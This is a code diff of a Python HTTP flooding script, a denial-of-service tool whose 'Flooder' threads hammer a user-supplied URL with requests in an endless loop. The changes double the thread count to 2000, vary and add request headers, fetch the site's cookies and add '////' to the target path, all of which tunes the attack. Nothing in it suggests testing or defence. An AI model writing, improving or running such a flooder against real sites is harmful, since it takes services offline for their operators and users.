@@ -11,7 +11,7 @@ import random
 import sys
 
 # Global parameters
-thread_limit = 1000  # Number of threads
+thread_limit = 2000  # Number of threads
 user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
 # Global parameters end
 
@@ -25,21 +25,23 @@ class Flooder(threading.Thread):
     def run(self):
         try:
             while True:
-                q1 = str(round(random.uniform(0.5, 0.7), 1))
-                q2 = str(round(random.uniform(0.7, 1), 1))
+                q1 = str(round(random.uniform(0.5, 0.9), 1))
+                q2 = str(round(random.uniform(0.6, 1), 1))
                 cur_header = {
                     "Content-type": "application/x-www-form-urlencoded",
                     "Accept": "text/plain; q=" + q1 + ", text/html, "
                               "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
                     "Connection": "Keep-Alive",
+                    "Keep-alive": "300",
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache",
                     "User-agent": user_agent,
-                    "Cookie": cookie,
-                    "Accept-Encoding": "gzip;q=1.0, identity; q=0.5, *;q=0"
+                    "Cookie": str(cookie),
+                    "Accept-Encoding": "gzip,deflate"
                 }
                 req = urllib.request.Request(str_target, headers=cur_header)
-                urllib.request.urlopen(req, timeout=60000)
+                urllib.request.urlopen(req, timeout=300)
+                # print(resp.read())
         except:
             pass
 
@@ -75,16 +77,25 @@ target = urllib.parse.urlparse(target)
 if target.netloc.__len__() == 0:
     print("Incorrect url input")
     exit()
-str_target = target.scheme+"://"+target.netloc+target.path+target.params
-if target.path.__len__() ==0:
-    str_target = str_target + "/"
-#  preparations ended
+str_target = target.scheme+"://"+target.netloc+target.path
+# if target.path != "/":
+#     str_target = str_target + "////"
+
+# preparations ended
 
 #  getting cookies
 req = urllib.request.Request(str_target)
-resp = urllib.request.urlopen(req)
-cookie = resp.headers['Set-Cookie']
+try:
+    resp = urllib.request.urlopen(req, timeout=10)
+    cookie = resp.headers['Set-Cookie']
+    print(cookie)
+    print("Cookies accepted")
+except:
+    print("Can't get cookies")
+    pass
 #  end cookies getting
+
+str_target = str_target + "////" # hmm
 
 print("Flooding %s" % str_target)
 Checker().start()
